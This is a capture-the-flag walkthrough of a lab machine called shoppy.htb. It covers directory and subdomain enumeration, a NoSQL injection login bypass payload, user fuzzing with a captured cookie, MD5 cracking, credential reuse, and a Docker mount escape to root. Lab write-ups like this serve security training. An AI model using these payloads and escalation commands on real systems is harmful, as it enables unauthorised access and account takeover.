## open ports

- 22 = ssh 
- 80 = nginx http

## enumerating directories and subdomains

```bash
# find directories
gobuster dir -u http://shoppy.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt

# find subdomains
gobuster dns -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 50 -d shoppy.htb
```

These scans reveals that there is a login page under `shoppy.htb/login` and asubdomain `mattermost`

## nosql injection

The login site is vulnerable to nosql injection which can be exploited when submitting `admin'||'1==1` as username.

By logging in we can search for users and get the hashed password. 
We now the user `admin` exists because we used his username in the nosql injection so we know how a positive search result looks like. 

With this information we can look for other users with `wfuzz`

## get users with wfuzz

```bash
wfuzz -c -z file,/usr/share/seclists/Usernames/Names/names.txt -L --hh 2561 --hc 500 -b "Cookie: rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2FU2e5ivWS313EqHejrDqmqWBOz%2B7JiK1ZGG8%2F1YJwbMqu75MRDE0GU; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FUY9maqReUKFXmGrrT34nxbATStnx0je7zCF90BWcHFlQ0UyMBoDkHwtnp1WJHOC9wgPADeoHzXw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX18zrc11pNHh3MGWXwjk8h1haEPxMCFoUas%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2BvmEdwpOw3wnRMj5AHU%2BCwhP1yuW80jog%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX18s9pN%2BNQ675PZeUnKOiPXIxXeioQcUDB8%3D; connect.sid=s%3A9xH10SZ2ZaAI3nOvgVp8GSxULBvnaDUp.e%2BkKff%2B%2BDrQhWq5D35SR4qy4jYNJraJLAzGmS9ByjEw" http://shoppy.htb/admin/search-users\?username\=FUZZ
```

Important here is to follow the request with the `-L` argument and to give it the header value with the `-b` argument. 
I was struggeling a bit with it because it always returned the same results until I tried it with curl and recognized that the request needs the cookie to success. 

When using right the resulting users are `admin` which we already knew and `josh`
```
000000086:   200        55 L     160 W      2720 Ch     "admin"
000004909:   200        55 L     160 W      2720 Ch     "josh"
```

When clicking on "Download Export" we get an `id`, `username` and a hashed `password`.
By looking at the length of the hashed password we can recognize that it is 32 chars long which can be a indication for the weak md5 hashing alogorithm.

## cracking found passwords

Using `hashcat` we have to store the two hashes from `admin` and `josh` in a file `hash.txt`
By runnig `hashcat hash.txt` we can determine what kind of hash it could be and so make sure that the md5 assumption is right. 
To crack the passwords run:
```bash
hashcat -m 0 --show hash.txt rockyou.txt
```

## getting user level

So we get the password for `josh` which we can use for the subdomain `mattermost`.Here we can login as `josh` and by looking around there are credentials for `jaeger` which we can use to `ssh` into the box and get the `user.txt`.

## privilege escalation

By running `sudo -l` we can examine which commands the user can execute.  
We find the executable `/home/deploy/password-manager` which we can run as the `deploy` user.

```bash
sudo -u deploy /home/deploy/password-manager`
```

We are asked about a master password which we can reverse engineer.

## reverse engineering master password

By copying the executable to the loacl maschine we can inspect it with the tools we are familiar with. 
First I tried to get the strings in it to look if the password where used in clear text in the source code. 
```bash 
strings password-manager
```
Unfortunately no success with it. 

To continue we can use radare2 to get more information about the executable.

```
r2 password-manager
aaa
s main 
VV
```

In the now presented callflow we can find a string `Sample`.

So we can authenticate in the password-manager with this master password and we get the credentials for the deploy user.

We can now login as `deploy` by executing `su deploy`

## getting root

Still no permissions to access `/root` so we have to continue...

By looking around be can find out that we can docker without super user rights.
So we look for docker in GTFOBins to bypass security restrictions and find [this](https://gtfobins.github.io/gtfobins/docker/).

To become `root` we run the command explained at the bottom of the site. 

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Voila. We are root
